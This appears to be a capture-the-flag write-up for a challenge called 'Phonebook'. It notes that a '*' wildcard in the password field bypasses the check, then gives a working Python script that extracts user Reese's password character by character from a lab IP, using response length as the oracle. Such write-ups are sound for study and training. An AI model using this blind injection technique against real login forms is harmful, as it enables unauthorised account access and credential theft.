# Phonebook
![Screenshot from 2021-08-15 10-33-20](https://user-images.githubusercontent.com/87865134/129466125-7b06e22a-a1d8-4ab2-a513-110b8d2cf735.png)

## - Hint: 
- Username is **Reese**
- Password can use regex because enter password = * can login
![Screenshot from 2021-08-15 10-34-00](https://user-images.githubusercontent.com/87865134/129466173-e55e685d-baf4-4150-af59-3c697ecfeedd.png)

> => write script to get password

## - Script to get password:
```python
import requests

url = 'http://139.59.166.56:31421/login'

characters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
"#","$","%","@","!","0","1","2","3","4","5","6","7","8","9","{","}","[","]","_","&","^"," "]

password = ''

# request ok 2586
# request fail 2214

while True:
    flag = True
    for char in characters:
        tmp = password + char + '*'
        data = {'username': 'Reese', 'password': tmp}
        res = requests.post(url, data)
        con_len = res.headers['Content-length']
        if con_len == '2586':
            print(char)
            password += char
            flag = False
            break
    if flag == True:
        break

print(password)
```
![Screenshot from 2021-08-15 11-10-00](https://user-images.githubusercontent.com/87865134/129466848-8e77b9ee-e4c7-4977-9229-23278bc61107.png)
